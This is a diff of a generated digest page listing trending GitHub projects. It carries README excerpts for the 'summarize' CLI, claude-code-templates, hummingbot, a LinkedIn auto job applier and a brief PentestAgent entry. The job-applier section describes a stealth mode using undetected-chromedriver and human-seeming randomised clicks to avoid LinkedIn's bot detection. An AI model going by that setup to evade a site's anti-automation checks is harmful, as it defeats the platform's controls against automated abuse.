CLIs (Codex, Claude, Gemini, Agent) Summarize can use common coding CLIs as local model backends: codex -&gt; --cli codex / --model cli/codex/ claude -&gt; --cli claude / --model cli/claude/ gemini -&gt; --cli gemini / --model cli/gemini/ agent (Cursor Agent CLI) -&gt; --cli agent / --model cli/agent/ Requirements: Binary installed and on PATH (or set CODEX_PATH, CLAUDE_PATH, GEMINI_PATH, AGENT_PATH) Provider authenticated (codex login, claude auth, gemini login flow, agent login or CURSOR_API_KEY) Quick smoke test: printf "Summarize CLI smoke input.\nOne short paragraph. Reply can be brief.\n" &gt;/tmp/summarize-cli-smoke.txt summarize --cli codex --plain --timeout 2m /tmp/summarize-cli-smoke.txt
+summarize --cli claude --plain --timeout 2m /tmp/summarize-cli-smoke.txt
+summarize --cli gemini --plain --timeout 2m /tmp/summarize-cli-smoke.txt
+summarize --cli agent --plain --timeout 2m /tmp/summarize-cli-smoke.txt Set explicit CLI allowlist/order: { "cli": { "enabled": ["codex", "claude", "gemini", "agent"] }
+} Configure implicit auto CLI fallback: { "cli": { "autoFallback": { "enabled": true, "onlyWhenNoApiKeys": true, "order": ["claude", "gemini", "codex", "agent"] } }
+} More details: docs/cli.md Auto model ordering --model auto builds candidate attempts from built-in rules (or your model.rules overrides). CLI attempts are prepended when: cli.enabled is set (explicit allowlist/order), or implicit auto selection is active and cli.autoFallback is enabled. Default fallback behavior: only when no API keys are configured, order claude, gemini, codex, agent, and remember/prioritize last successful provider (~/.summarize/cli-state.json). Set explicit CLI attempts: { "cli": { "enabled": ["gemini"] }
+} Disable implicit auto CLI fallback: { "cli": { "autoFallback": { "enabled": false } }
+} Note: explicit --model auto does not trigger implicit auto CLI fallback unless cli.enabled is set. Website extraction (Firecrawl + Markdown) Non-YouTube URLs go through a fetch -&gt; extract pipeline. When direct fetch/extraction is blocked or too thin, --firecrawl auto can fall back to Firecrawl (if configured). --firecrawl off|auto|always (default auto) --extract --format md|text (default text; if --format is omitted, --extract defaults to md for non-YouTube URLs) --markdown-mode off|auto|llm|readability (default readability) auto: use an LLM converter when configured; may fall back to uvx markitdown llm: force LLM conversion (requires a configured model key) off: disable LLM conversion (still may return Firecrawl Markdown when configured) Plain-text mode: use --format text. YouTube transcripts --youtube auto tries best-effort web transcript endpoints first. When captions are not available, it falls back to: Apify (if APIFY_API_TOKEN is set): uses a scraping actor (faVsWy9VTSNVIhWpR) yt-dlp + Whisper (if yt-dlp is available): downloads audio, then transcribes with local whisper.cpp when installed (preferred), otherwise falls back to OpenAI (OPENAI_API_KEY) or FAL (FAL_KEY) Environment variables for yt-dlp mode: YT_DLP_PATH - optional path to yt-dlp binary (otherwise yt-dlp is resolved via PATH) SUMMARIZE_WHISPER_CPP_MODEL_PATH - optional override for the local whisper.cpp model file SUMMARIZE_WHISPER_CPP_BINARY - optional override for the local binary (default: whisper-cli) SUMMARIZE_DISABLE_LOCAL_WHISPER_CPP=1 - disable local whisper.cpp (force remote) OPENAI_API_KEY - OpenAI Whisper transcription OPENAI_WHISPER_BASE_URL - optional OpenAI-compatible Whisper endpoint override FAL_KEY - FAL AI Whisper fallback Apify costs money but tends to be more reliable when captions exist. Slide extraction (YouTube + direct video URLs) Extract slide screenshots (scene detection via ffmpeg) and optional OCR: summarize "https://www.youtube.com/watch?v=..." --slides
+summarize "https://www.youtube.com/watch?v=..." --slides --slides-ocr Outputs are written under ./slides// (or --slides-dir). OCR results are included in JSON output (--json) and stored in slides.json inside the slide directory. When scene detection is too sparse, the extractor also samples at a fixed interval to improve coverage. When using --slides, supported terminals (kitty/iTerm/Konsole) render inline thumbnails automatically inside the summary narrative (the model inserts [slide:N] markers). Timestamp links are clickable when the terminal supports OSC-8 (YouTube/Vimeo/Loom/Dropbox). If inline images are unsupported, Summarize prints a note with the on-disk slide directory. Use --slides --extract to print the full timed transcript and insert slide images inline at matching timestamps. Format the extracted transcript as Markdown (headings + paragraphs) via an LLM: summarize "https://www.youtube.com/watch?v=..." --extract --format md --markdown-mode llm Media transcription (Whisper) Local audio/video files are transcribed first, then summarized. --video-mode transcript forces direct media URLs (and embedded media) through Whisper first. Prefers local whisper.cpp when available; otherwise requires OPENAI_API_KEY or FAL_KEY. Local ONNX transcription (Parakeet/Canary) Summarize can use NVIDIA Parakeet/Canary ONNX models via a local CLI you provide. Auto selection (default) prefers ONNX when configured. Setup helper: summarize transcriber setup Install sherpa-onnx from upstream binaries/build (Homebrew may not have a formula) Auto selection: set SUMMARIZE_ONNX_PARAKEET_CMD or SUMMARIZE_ONNX_CANARY_CMD (no flag needed) Force a model: --transcriber parakeet|canary|whisper|auto Docs: docs/nvidia-onnx-transcription.md Verified podcast services (2025-12-25) Run: summarize Apple Podcasts Spotify Amazon Music / Audible podcast pages Podbean Podchaser RSS feeds (Podcasting 2.0 transcripts when available) Embedded YouTube podcast pages (e.g. JREPodcast) Transcription: prefers local whisper.cpp when installed; otherwise uses OpenAI Whisper or FAL when keys are set. Translation paths --language/--lang controls the output language of the summary (and other LLM-generated text). Default is auto. When the input is audio/video, the CLI needs a transcript first. The transcript comes from one of these paths: Existing transcript (preferred) YouTube: uses youtubei / captionTracks when available. Podcasts: uses Podcasting 2.0 RSS (JSON/VTT) when the feed publishes it. Whisper transcription (fallback) YouTube: falls back to yt-dlp (audio download) + Whisper transcription when configured; Apify is a last resort. Prefers local whisper.cpp when installed + model available. Otherwise uses cloud Whisper (OpenAI OPENAI_API_KEY) or FAL (FAL_KEY). For direct media URLs, use --video-mode transcript to force transcribe -&gt; summarize: summarize https://example.com/file.mp4 --video-mode transcript --lang en Configuration Single config location: ~/.summarize/config.json Supported keys today: { "model": { "id": "openai/gpt-5-mini" }, "env": { "OPENAI_API_KEY": "sk-..." }, "ui": { "theme": "ember" }
+} Shorthand (equivalent): { "model": "openai/gpt-5-mini"
+} Also supported: model: { "mode": "auto" } (automatic model selection + fallback; see docs/model-auto.md) model.rules (customize candidates / ordering) models (define presets selectable via --model ) env (generic env var defaults; process env still wins) apiKeys (legacy shortcut, mapped to env names; prefer env for new configs) cache.media (media download cache: TTL 7 days, 2048 MB cap by default; --no-media-cache disables) media.videoMode: "auto"|"transcript"|"understand" slides.enabled / slides.max / slides.ocr / slides.dir (defaults for --slides) ui.theme: "aurora"|"ember"|"moss"|"mono" openai.useChatCompletions: true (force OpenAI-compatible chat completions) Note: the config is parsed leniently (JSON5), but are not allowed. Unknown keys are ignored. Media cache defaults: { "cache": { "media": { "enabled": true, "ttlDays": 7, "maxMb": 2048, "verify": "size" } }
+} Note: --no-cache bypasses summary caching only (LLM output). Extract/transcript caches still apply. Use --no-media-cache to skip media files. Precedence: --model SUMMARIZE_MODEL ~/.summarize/config.json default (auto) Theme precedence: --theme SUMMARIZE_THEME ~/.summarize/config.json (ui.theme) default (aurora) Environment variable precedence: process env ~/.summarize/config.json (env) ~/.summarize/config.json (apiKeys, legacy) Environment variables Set the key matching your chosen --model: Optional fallback defaults can be stored in config: ~/.summarize/config.json -&gt; "env": { "OPENAI_API_KEY": "sk-..." } process env always takes precedence legacy "apiKeys" still works (mapped to env names) OPENAI_API_KEY (for openai/...) NVIDIA_API_KEY (for nvidia/...) ANTHROPIC_API_KEY (for anthropic/...) XAI_API_KEY (for xai/...) Z_AI_API_KEY (for zai/...; supports ZAI_API_KEY alias) GEMINI_API_KEY (for google/...) also accepts GOOGLE_GENERATIVE_AI_API_KEY and GOOGLE_API_KEY as aliases OpenAI-compatible chat completions toggle: OPENAI_USE_CHAT_COMPLETIONS=1 (or set openai.useChatCompletions in config) UI theme: SUMMARIZE_THEME=aurora|ember|moss|mono SUMMARIZE_TRUECOLOR=1 (force 24-bit ANSI) SUMMARIZE_NO_TRUECOLOR=1 (disable 24-bit ANSI) OpenRouter (OpenAI-compatible): Set OPENROUTER_API_KEY=... Prefer forcing OpenRouter per model id: --model openrouter// Built-in preset: --model free (uses a default set of OpenRouter :free models) summarize refresh-free Quick start: make free the default (keep auto available) summarize refresh-free --set-default
+summarize "https://example.com"
+summarize "https://example.com" --model auto Regenerates the free preset (models.free in ~/.summarize/config.json) by: Fetching OpenRouter /models, filtering :free Skipping models that look very small (&lt;27B by default) based on the model id/name Testing which ones return non-empty text (concurrency 4, timeout 10s) Picking a mix of smart-ish (bigger context_length / output cap) and fast models Refining timings and writing the sorted list back If --model free stops working, run: summarize refresh-free Flags: --runs 2 (default): extra timing runs per selected model (total runs = 1 + runs) --smart 3 (default): how many smart-first picks (rest filled by fastest) --min-params 27b (default): ignore models with inferred size smaller than N billion parameters --max-age-days 180 (default): ignore models older than N days (set 0 to disable) --set-default: also sets "model": "free" in ~/.summarize/config.json Example: OPENROUTER_API_KEY=sk-or-... summarize "https://example.com" --model openrouter/meta-llama/llama-3.1-8b-instruct:free
+OPENROUTER_API_KEY=sk-or-... summarize "https://example.com" --model openrouter/minimax/minimax-m2.5 If your OpenRouter account enforces an allowed-provider list, make sure at least one provider is allowed for the selected model. When routing fails, summarize prints the exact providers to allow. Legacy: OPENAI_BASE_URL=https://openrouter.ai/api/v1 (and either OPENAI_API_KEY or OPENROUTER_API_KEY) also works. NVIDIA API Catalog (OpenAI-compatible; free credits): Set NVIDIA_API_KEY=... Optional: NVIDIA_BASE_URL=https://integrate.api.nvidia.com/v1 Credits: API Catalog trial starts with 1000 free API credits on signup (up to 5000 total via “Request More” in the API Catalog profile) Pick a model id from /v1/models (examples: fast stepfun-ai/step-3.5-flash, strong but slower z-ai/glm5) export NVIDIA_API_KEY="nvapi-..."
+summarize "https://example.com" --model nvidia/stepfun-ai/step-3.5-flash Z.AI (OpenAI-compatible): Z_AI_API_KEY=... (or ZAI_API_KEY=...) Optional base URL override: Z_AI_BASE_URL=... Optional services: FIRECRAWL_API_KEY (website extraction fallback) YT_DLP_PATH (path to yt-dlp binary for audio extraction) FAL_KEY (FAL AI API key for audio transcription via Whisper) APIFY_API_TOKEN (YouTube transcript fallback) Model limits The CLI uses the LiteLLM model catalog for model limits (like max output tokens): Downloaded from: https://raw.githubusercontent.com/BerriAI/litellm/main/model_prices_and_context_window.json Cached at: ~/.summarize/cache/ Library usage (optional) (minimal deps): @steipete/summarize-core/content @steipete/summarize-core/prompts Compatibility (pulls in CLI deps): @steipete/summarize/content @steipete/summarize/prompts Development pnpm install
+pnpm check More Docs index: docs/README.md CLI providers and config: docs/cli.md Auto model rules: docs/model-auto.md Website extraction: docs/website.md YouTube handling: docs/youtube.md Media pipeline: docs/media.md Config schema and precedence: docs/config.md Troubleshooting "Receiving end does not exist": Chrome did not inject the content script yet. Extension details -&gt; Site access -&gt; On all sites (or allow this domain) Reload the tab once. "Failed to fetch" / daemon unreachable: summarize daemon status Logs: ~/.summarize/logs/daemon.err.log License: MIT
 
 </div>
 
 <div class="article-item" data-lang="en" data-category="opensource" data-source="GitHub Trending Python">
 
-### 14. `EN` [davila7/claude-code-templates](data/articles/95ae7120d6074efd4c3dd1b7a885b1e0.html)
-**Source:** GitHub Trending Python | **Keyword:** `GitHub`
-CLI tool for configuring and monitoring Claude Code Claude Code Templates (aitmpl.com) Ready-to-use configurations for Anthropic's Claude Code. A comprehensive collection of AI agents, custom commands, settings, hooks, external integrations (MCPs), and project templates to enhance your development workflow. Browse &amp; Install Components and Templates Browse All Templates - Interactive web interface to explore and install 100+ agents, commands, settings, hooks, and MCPs. Quick Installation # Install a complete development stack
-npx claude-code-templates@latest --agent development-team/frontend-developer --command testing/generate-tests --mcp development/github-integration --yes # Browse and install interactively
-npx claude-code-templates@latest # Install specific components
-npx claude-code-templates@latest --agent development-tools/code-reviewer --yes
-npx claude-code-templates@latest --command performance/optimize-bundle --yes
-npx claude-code-templates@latest --setting performance/mcp-timeouts --yes
-npx claude-code-templates@latest --hook git/pre-commit-validation --yes
-npx claude-code-templates@latest --mcp database/postgresql-integration --yes What You Get Component Description Examples Agents AI specialists for specific domains Security auditor, React performance optimizer, database architect Commands Custom slash commands /generate-tests, /optimize-bundle, /check-security MCPs External service integrations GitHub, PostgreSQL, Stripe, AWS, OpenAI Settings Claude Code configurations Timeouts, memory settings, output styles Hooks Automation triggers Pre-commit validation, post-completion actions Skills Reusable capabilities with progressive disclosure PDF processing, Excel automation, custom workflows Additional Tools Beyond the template catalog, Claude Code Templates includes powerful development tools: Claude Code Analytics Monitor your AI-powered development sessions in real-time with live state detection and performance metrics. npx claude-code-templates@latest --analytics Conversation Monitor Mobile-optimized interface to view Claude responses in real-time with secure remote access. # Local access
-npx claude-code-templates@latest --chats # Secure remote access via Cloudflare Tunnel
-npx claude-code-templates@latest --chats --tunnel Health Check Comprehensive diagnostics to ensure your Claude Code installation is optimized. npx claude-code-templates@latest --health-check Plugin Dashboard View marketplaces, installed plugins, and manage permissions from a unified interface. npx claude-code-templates@latest --plugins Documentation docs.aitmpl.com - Complete guides, examples, and API reference for all components and tools. Contributing We welcome contributions! Browse existing templates to see what's available, then check our contributing guidelines to add your own agents, commands, MCPs, settings, or hooks. Please read our Code of Conduct before contributing. Attribution This collection includes components from multiple sources: Scientific Skills: K-Dense-AI/claude-scientific-skills by K-Dense Inc. - MIT License (139 scientific skills for biology, chemistry, medicine, and computational research) Official Anthropic: anthropics/skills - Official Anthropic skills (21 skills) anthropics/claude-code - Development guides and examples (10 skills) Community Skills &amp; Agents: obra/superpowers by Jesse Obra - MIT License (14 workflow skills) alirezarezvani/claude-skills by Alireza Rezvani - MIT License (36 professional role skills) wshobson/agents by wshobson - MIT License (48 agents) NerdyChefsAI Skills - Community contribution - MIT License (specialized enterprise skills) Commands &amp; Tools: awesome-claude-code by hesreallyhim - CC0 1.0 Universal (21 commands) awesome-claude-skills - Apache 2.0 (community skills) move-code-quality-skill - MIT License cocoindex-claude - Apache 2.0 Each of these resources retains its original license and attribution, as defined by their respective authors. We respect and credit all original creators for their work and contributions to the Claude ecosystem. License This project is licensed under the MIT License - see the LICENSE file for details. Links Browse Templates: aitmpl.com Documentation: docs.aitmpl.com Community: GitHub Discussions Issues: GitHub Issues Stargazers over time Found this useful? Give us a star to support the project!
-
-</div>
-
-<div class="article-item" data-lang="en" data-category="opensource" data-source="GitHub Trending Python">
-
-### 15. `EN` [GodsScion/Auto_job_applier_linkedIn](data/articles/be2056494dffa9a05d6a3db0043d1f50.html)
-**Source:** GitHub Trending Python | **Keyword:** `GitHub`
-Make your job hunt easy by automating your application process with this Auto Applier LinkedIn AI Auto Job Applier This is an web scraping bot that automates the process of job applications on LinkedIn. It searches for jobs relevant to you, answers all questions in application form, customizes your resume based on the collected job information, such as skills required, description, about company, etc. and applies to the job. Can apply 100+ jobs in less than 1 hour. See it in Action Click on above image to watch the demo or use this link https://youtu.be/gMbB1fWZDHw Content Introduction Demo Video Index Install Configure Contributor Guidelines Updates Disclaimer Terms and Conditions License Socials Support and Discussions How to install Click on above image to watch the tutorial for installation and configuration or use this link https://youtu.be/f9rdz74e1lM ( to watch it in 2x speed) Python 3.10 or above. Visit https://www.python.org/downloads/ to download and install Python, or for windows you could visit Microsoft Store and search for "Python". Please make sure Python is added to Path in System Environment Variables. Install necessary Undetected Chromedriver, PyAutoGUI and Setuptools packages. After Python is installed, OPEN a console/terminal or shell, Use below command that uses the pip command-line tool to install these 3 package. pip install undetected-chromedriver pyautogui setuptools openai flask-cors flask Download and install latest version of Google Chrome in it's default location, visit https://www.google.com/chrome to download it's installer. Clone the current git repo or download it as a zip file, url to the latest update https://github.com/GodsScion/Auto_job_applier_linkedIn. (Not needed if you set stealth_mode = True in config/settings.py ) Download and install the appropriate Chrome Driver for Google Chrome and paste it in the location Chrome was installed, visit https://googlechromelabs.github.io/chrome-for-testing/ to download. OR If you are using Windows, click on windows-setup.bat available in the /setup folder, this will install the latest chromedriver automatically. If you have questions or need help setting it up or to talk in general, join the github server: https://discord.gg/fFp7uUzWCY back to index How to configure Open personals.py file in /config folder and enter your details like name, phone number, address, etc. Whatever you want to fill in your applications. Open questions.py file in /config folder and enter your answers for application questions, configure wether you want the bot to pause before submission or pause if it can't answer unknown questions. Open search.py file in /config folder and enter your search preferences, job filters, configure the bot as per your needs (these settings decide which jobs to apply for or skip). Open secrets.py file in /config folder and enter your LinkedIn username, password to login and OpenAI API Key for generation of job tailored resumes and cover letters (This entire step is optional). If you do not provide username or password or leave them as default, it will login with saved profile in browser, if failed will ask you to login manually. Open settings.py file in /config folder to configure the bot settings like, keep screen awake, click intervals (click intervals are randomized to seem like human behavior), run in background, stealth mode (to avoid bot detection), etc. as per your needs. (Optional) Don't forget to add you default resume in the location you mentioned in default_resume_path = "all resumes/default/resume.pdf" given in /config/questions.py. If one is not provided, it will use your previous resume submitted in LinkedIn or (In Development) generate custom resume if OpenAI APT key is provided! Run runAiBot.py and see the magic happen. To run the Applied Jobs history UI, run app.py and open web browser on http://localhost:5000. If you have questions or need help setting it up or to talk in general, join the github server: https://discord.gg/fFp7uUzWCY back to index Contributor Guidelines Thank you for your efforts and being a part of the community. All contributions are appreciated no matter how small or big. Once you contribute to the code base, your work will be remembered forever. NOTE: Only Pull request to community-version branch will be accepted. Any other requests will be declined by default, especially to main branch. Once your code is tested, your changes will be merged to the main branch in next cycle. Code Guidelines Functions: All functions or methods are named lower case and snake case Must have explanation of their purpose. Write explanation surrounded in ''' Explanation ''' under the definition def function() -&gt; None:. Example: def function() -&gt; None: ''' This function does nothing, it's just an example for explanation placement! ''' The Types (str, list, int, list[str], int | float) for the parameters and returns must be given. Example: def function(param1: str, param2: list[str], param3: int) -&gt; str: Putting all that together some valid examples for function or method declarations would be as follows. def function_name_in_camel_case(parameter1: driver, parameter2: str) -&gt; list[str] | ValueError: ''' This function is an example for code guidelines ''' return [parameter2, parameter2.lower()] The hashtag on top of functions are optional, which are intended for developers # for developers. # Enter input text function
-def text_input_by_ID(driver: WebDriver, id: str, value: str, time: float=5.0) -&gt; None | Exception: ''' Enters `value` into the input field with the given `id` if found, else throws NotFoundException. - `time` is the max time to wait for the element to be found. ''' username_field = WebDriverWait(driver, time).until(EC.presence_of_element_located((By.ID, id))) username_field.send_keys(Keys.CONTROL + "a") username_field.send_keys(value) Variables All variables must start with lower case, must be in explainable full words. If someone reads the variable name, it should be easy to understand what the variable stores. All local variables are camel case. Examples: jobListingsElement = None localBufferTime = 5.5 All global variables are snake case. Example: total_runs = 1 Mentioning types are optional. localBufferTime: float | int = 5.5 Configuration variables All config variables are treated as global variables. They have some extra guidelines. Must have variable setting explanation, and examples of valid values. Examples: # Explanation of what this setting will do, and instructions to enter it correctly
-config_variable = "value1" # "value1", "value2", etc. Don't forget quotes ("") # Do you want to randomize the search order for search_terms?
-randomize_search_order = False # True of False, Note: True or False are case-sensitive # Avoid applying to jobs if their required experience is above your current_experience. (Set value as -1 if you want to apply to all ignoring their required experience...)
-current_experience = 5 # Integers &gt; -2 (Ex: -1, 0, 1, 2, 3, 4...) # Search location, this will be filled in "City, state, or zip code" search box. If left empty as "", tool will not fill it.
-search_location = "United States" # Some valid examples: "", "United States", "India", "Chicago, Illinois, United States", "90001, Los Angeles, California, United States", "Bengaluru, Karnataka, India", etc. Add the config variable in appropriate /config/file. Every config variable must be validated. Go to /modules/validator.py and add it over there. Example: For config variable search_location = "" found in /config/search.py, string validation is added in file /modules/validator.py under the method def validate_search(). def validate_search() -&gt; None | ValueError | TypeError: ''' Validates all variables in the `/config/search.py` file. ''' check_string(search_location, "search_location") back to index Attestation All contributions require proper attestion. Format for attestation: ##&gt; ------ : OR - ------ print("My contributions ") # Your code
-##&lt; Examples for proper attestation: New feature example ##&gt; ------ Sai Vignesh Golla : godsscion - Feature ------
-def alert_box(title: str, message: str) -&gt; None: ''' Shows an alert box with the given `title` and `message`. ''' from pyautogui import alert return alert(title, message) ##&lt; Bug fix example def alert_box(title: str, message: str) -&gt; None: ''' Shows an alert box with the given `title` and `message`. ''' from pyautogui import alert ##&gt; ------ Sai Vignesh Golla : saivigneshgolla@outlook.com - Bug fix ------ return alert(message, title)
-
-</div>
-
-<div class="article-item" data-lang="en" data-category="opensource" data-source="GitHub Trending Python">
-
-### 16. `EN` [hummingbot/hummingbot](data/articles/2c741fa5ac3137ab3777c88437f70ce8.html)
-**Source:** GitHub Trending Python | **Keyword:** `GitHub`
-Open source software that helps you create and deploy high-frequency crypto trading bots Hummingbot is an open-source framework that helps you design and deploy automated trading strategies, or bots, that can run on many centralized or decentralized exchanges. Over the past year, Hummingbot users have generated over $34 billion in trading volume across 140+ unique trading venues. The Hummingbot codebase is free and publicly available under the Apache 2.0 open-source license. Our mission is to democratize high-frequency trading by creating a global community of algorithmic traders and developers that share knowledge and contribute to the codebase. Quick Links Website and Docs: Official Hummingbot website and documentation Installation: Install Hummingbot on various platforms Discord: The main gathering spot for the global Hummingbot community YouTube: Videos that teach you how to get the most out of Hummingbot Twitter: Get the latest announcements about Hummingbot Reported Volumes: Reported trading volumes across all Hummingbot instances Newsletter: Get our newsletter whenever we ship a new release Getting Started The easiest way to get started with Hummingbot is using Docker: To install the Telegram Bot Condor, follow the instructions in the Hummingbot Docs site. To install the CLI-based Hummingbot client, follow the instructions below. Alternatively, if you are building new connectors/strategies or adding custom code, see the Install from Source section in the documentation. Install Hummingbot with Docker Install Docker Compose website. Clone the repo and use the provided docker-compose.yml file: # Clone the repository
-git clone https://github.com/hummingbot/hummingbot.git
-cd hummingbot # Run Setup &amp; Deploy
-make setup
-make deploy # Attach to the running instance
-docker attach hummingbot Install Hummingbot + Gateway DEX Middleware Gateway provides standardized connectors for interacting with automatic market maker (AMM) decentralized exchanges (DEXs) across different blockchain networks. To run Hummingbot with Gateway, clone the repo and answer y when prompted after running make setup # Clone the repository
-git clone https://github.com/hummingbot/hummingbot.git
-cd hummingbot make setup # Answer `y` when prompted
-Include Gateway? [y/N] Then run: make deploy # Attach to the running instance
-
-</div>
-
-<div class="article-item" data-lang="en" data-category="opensource" data-source="GitHub Trending Python">
-
-### 17. `EN` [GH05TCREW/pentestagent](data/articles/505f0757f41493c4e2acd2a58890e68d.html)
+### 15. `EN` [GH05TCREW/pentestagent](data/articles/505f0757f41493c4e2acd2a58890e68d.html)
 **Source:** GitHub Trending Python | **Keyword:** `GitHub`
 PentestAgent is an AI agent framework for black-box security testing, supporting bug bounty, red-team, and penetration testing workflows. PentestAgent AI Penetration Testing https://github.com/user-attachments/assets/a67db2b5-672a-43df-b709-149c8eaee975 Requirements Python 3.10+ API key for OpenAI, Anthropic, or other LiteLLM-supported provider Install # Clone
 git clone https://github.com/GH05TCREW/pentestagent.git
@@ -10145,40 +10197,80 @@ ruff check pentestagent # Lint Legal Only use against systems you have explicit 
 
 </div>
 
+<div class="article-item" data-lang="en" data-category="opensource" data-source="GitHub Trending Python">
+
+### 16. `EN` [GodsScion/Auto_job_applier_linkedIn](data/articles/be2056494dffa9a05d6a3db0043d1f50.html)
+**Source:** GitHub Trending Python | **Keyword:** `GitHub`
+Make your job hunt easy by automating your application process with this Auto Applier LinkedIn AI Auto Job Applier This is an web scraping bot that automates the process of job applications on LinkedIn. It searches for jobs relevant to you, answers all questions in application form, customizes your resume based on the collected job information, such as skills required, description, about company, etc. and applies to the job. Can apply 100+ jobs in less than 1 hour. See it in Action Click on above image to watch the demo or use this link https://youtu.be/gMbB1fWZDHw Content Introduction Demo Video Index Install Configure Contributor Guidelines Updates Disclaimer Terms and Conditions License Socials Support and Discussions How to install Click on above image to watch the tutorial for installation and configuration or use this link https://youtu.be/f9rdz74e1lM ( to watch it in 2x speed) Python 3.10 or above. Visit https://www.python.org/downloads/ to download and install Python, or for windows you could visit Microsoft Store and search for "Python". Please make sure Python is added to Path in System Environment Variables. Install necessary Undetected Chromedriver, PyAutoGUI and Setuptools packages. After Python is installed, OPEN a console/terminal or shell, Use below command that uses the pip command-line tool to install these 3 package. pip install undetected-chromedriver pyautogui setuptools openai flask-cors flask Download and install latest version of Google Chrome in it's default location, visit https://www.google.com/chrome to download it's installer. Clone the current git repo or download it as a zip file, url to the latest update https://github.com/GodsScion/Auto_job_applier_linkedIn. (Not needed if you set stealth_mode = True in config/settings.py ) Download and install the appropriate Chrome Driver for Google Chrome and paste it in the location Chrome was installed, visit https://googlechromelabs.github.io/chrome-for-testing/ to download. OR If you are using Windows, click on windows-setup.bat available in the /setup folder, this will install the latest chromedriver automatically. If you have questions or need help setting it up or to talk in general, join the github server: https://discord.gg/fFp7uUzWCY back to index How to configure Open personals.py file in /config folder and enter your details like name, phone number, address, etc. Whatever you want to fill in your applications. Open questions.py file in /config folder and enter your answers for application questions, configure wether you want the bot to pause before submission or pause if it can't answer unknown questions. Open search.py file in /config folder and enter your search preferences, job filters, configure the bot as per your needs (these settings decide which jobs to apply for or skip). Open secrets.py file in /config folder and enter your LinkedIn username, password to login and OpenAI API Key for generation of job tailored resumes and cover letters (This entire step is optional). If you do not provide username or password or leave them as default, it will login with saved profile in browser, if failed will ask you to login manually. Open settings.py file in /config folder to configure the bot settings like, keep screen awake, click intervals (click intervals are randomized to seem like human behavior), run in background, stealth mode (to avoid bot detection), etc. as per your needs. (Optional) Don't forget to add you default resume in the location you mentioned in default_resume_path = "all resumes/default/resume.pdf" given in /config/questions.py. If one is not provided, it will use your previous resume submitted in LinkedIn or (In Development) generate custom resume if OpenAI APT key is provided! Run runAiBot.py and see the magic happen. To run the Applied Jobs history UI, run app.py and open web browser on http://localhost:5000. If you have questions or need help setting it up or to talk in general, join the github server: https://discord.gg/fFp7uUzWCY back to index Contributor Guidelines Thank you for your efforts and being a part of the community. All contributions are appreciated no matter how small or big. Once you contribute to the code base, your work will be remembered forever. NOTE: Only Pull request to community-version branch will be accepted. Any other requests will be declined by default, especially to main branch. Once your code is tested, your changes will be merged to the main branch in next cycle. Code Guidelines Functions: All functions or methods are named lower case and snake case Must have explanation of their purpose. Write explanation surrounded in ''' Explanation ''' under the definition def function() -&gt; None:. Example: def function() -&gt; None: ''' This function does nothing, it's just an example for explanation placement! ''' The Types (str, list, int, list[str], int | float) for the parameters and returns must be given. Example: def function(param1: str, param2: list[str], param3: int) -&gt; str: Putting all that together some valid examples for function or method declarations would be as follows. def function_name_in_camel_case(parameter1: driver, parameter2: str) -&gt; list[str] | ValueError: ''' This function is an example for code guidelines ''' return [parameter2, parameter2.lower()] The hashtag on top of functions are optional, which are intended for developers # for developers. # Enter input text function
+def text_input_by_ID(driver: WebDriver, id: str, value: str, time: float=5.0) -&gt; None | Exception: ''' Enters `value` into the input field with the given `id` if found, else throws NotFoundException. - `time` is the max time to wait for the element to be found. ''' username_field = WebDriverWait(driver, time).until(EC.presence_of_element_located((By.ID, id))) username_field.send_keys(Keys.CONTROL + "a") username_field.send_keys(value) Variables All variables must start with lower case, must be in explainable full words. If someone reads the variable name, it should be easy to understand what the variable stores. All local variables are camel case. Examples: jobListingsElement = None localBufferTime = 5.5 All global variables are snake case. Example: total_runs = 1 Mentioning types are optional. localBufferTime: float | int = 5.5 Configuration variables All config variables are treated as global variables. They have some extra guidelines. Must have variable setting explanation, and examples of valid values. Examples: # Explanation of what this setting will do, and instructions to enter it correctly
+config_variable = "value1" # "value1", "value2", etc. Don't forget quotes ("") # Do you want to randomize the search order for search_terms?
+randomize_search_order = False # True of False, Note: True or False are case-sensitive # Avoid applying to jobs if their required experience is above your current_experience. (Set value as -1 if you want to apply to all ignoring their required experience...)
+current_experience = 5 # Integers &gt; -2 (Ex: -1, 0, 1, 2, 3, 4...) # Search location, this will be filled in "City, state, or zip code" search box. If left empty as "", tool will not fill it.
+search_location = "United States" # Some valid examples: "", "United States", "India", "Chicago, Illinois, United States", "90001, Los Angeles, California, United States", "Bengaluru, Karnataka, India", etc. Add the config variable in appropriate /config/file. Every config variable must be validated. Go to /modules/validator.py and add it over there. Example: For config variable search_location = "" found in /config/search.py, string validation is added in file /modules/validator.py under the method def validate_search(). def validate_search() -&gt; None | ValueError | TypeError: ''' Validates all variables in the `/config/search.py` file. ''' check_string(search_location, "search_location") back to index Attestation All contributions require proper attestion. Format for attestation: ##&gt; ------ : OR - ------ print("My contributions ") # Your code
+##&lt; Examples for proper attestation: New feature example ##&gt; ------ Sai Vignesh Golla : godsscion - Feature ------
+def alert_box(title: str, message: str) -&gt; None: ''' Shows an alert box with the given `title` and `message`. ''' from pyautogui import alert return alert(title, message) ##&lt; Bug fix example def alert_box(title: str, message: str) -&gt; None: ''' Shows an alert box with the given `title` and `message`. ''' from pyautogui import alert ##&gt; ------ Sai Vignesh Golla : saivigneshgolla@outlook.com - Bug fix ------ return alert(message, title)
+
+</div>
+
+<div class="article-item" data-lang="en" data-category="opensource" data-source="GitHub Trending Python">
+
+### 17. `EN` [davila7/claude-code-templates](data/articles/95ae7120d6074efd4c3dd1b7a885b1e0.html)
+**Source:** GitHub Trending Python | **Keyword:** `GitHub`
+CLI tool for configuring and monitoring Claude Code Claude Code Templates (aitmpl.com) Ready-to-use configurations for Anthropic's Claude Code. A comprehensive collection of AI agents, custom commands, settings, hooks, external integrations (MCPs), and project templates to enhance your development workflow. Browse &amp; Install Components and Templates Browse All Templates - Interactive web interface to explore and install 100+ agents, commands, settings, hooks, and MCPs. Quick Installation # Install a complete development stack
+npx claude-code-templates@latest --agent development-team/frontend-developer --command testing/generate-tests --mcp development/github-integration --yes # Browse and install interactively
+npx claude-code-templates@latest # Install specific components
+npx claude-code-templates@latest --agent development-tools/code-reviewer --yes
+npx claude-code-templates@latest --command performance/optimize-bundle --yes
+npx claude-code-templates@latest --setting performance/mcp-timeouts --yes
+npx claude-code-templates@latest --hook git/pre-commit-validation --yes
